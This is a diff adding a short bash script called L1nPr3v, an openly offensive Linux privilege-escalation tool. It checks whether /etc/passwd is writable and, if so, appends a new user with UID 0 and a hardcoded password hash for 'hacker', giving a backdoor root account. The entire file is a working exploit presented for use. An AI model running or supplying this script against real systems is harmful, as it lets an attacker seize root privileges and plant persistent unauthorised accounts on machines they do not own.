@@ -1,0 +1,59 @@
+#!/bin/bash
+#L1nPr3v beta vertion
+
+
+#check write permission
+passwd_file_pre_check()
+{
+
+if [[ -w /etc/passwd ]]
+then
+  echo -e "\n\e[38;5;196m******************\e[00m" Privilege Escalation Using /etc/passwd File "\e[38;5;196m**********************\e[00m";
+  echo -e "\n\e[38;5;46m[!] Having write permission  \e[00m\n";
+  add_new_usr_to_passwd
+else
+  echo "You Don't Have Write Permission";
+fi
+
+}
+
+
+#creating new user with root permission
+add_new_usr_to_passwd()
+{
+
+
+
+passwd='$1$L98Hfy6q$OPmRrs4vfg8doJZwhEKdl1'
+read -p "Enter New User Name #~ " user_name
+echo $user;
+if [[ ! -z "$user_name" ]]
+then
+
+  echo -e "\ncreating new user \e[38;5;196;1m${user_name}\e[00m with password \e[38;5;196;1mhacker\e[00m"
+  echo "${user_name}:${passwd}:0:0:root:/root:/bin/bash" >> /etc/passwd
+  RESULT=$?
+    if [[ "${RESULT}" == 0 ]]
+      then
+          echo -e "\n\e[38;5;46m[*]exploitaion completed\e[00m";
+          echo -e "\n\e[38;5;46m[*]Switch To New User\e[00m";
+    else
+          echo -e "\n\e[38;5;196m sorry some error occured\e[00m";
+
+    fi
+else
+
+  echo -e "\n\e[38;5;196m Username must not be null\e[00m";
+
+fi
+
+}
+
+
+
+#main()
+echo -e "\n\e[00;31m-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-\e[00m"
+echo -e "\e[00;31m#\e[\033#6            L1nPr3v         \e[033#" "\e[00;31m#\e[00m"
+echo -e "\e\n[00;31m\e[\033# Version: beta             Author:H4r1                \e[033#" "\e[00;31m\e[00m"
+echo -e "\e[00;31m-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-=x=-\e[00m"
+passwd_file_pre_check
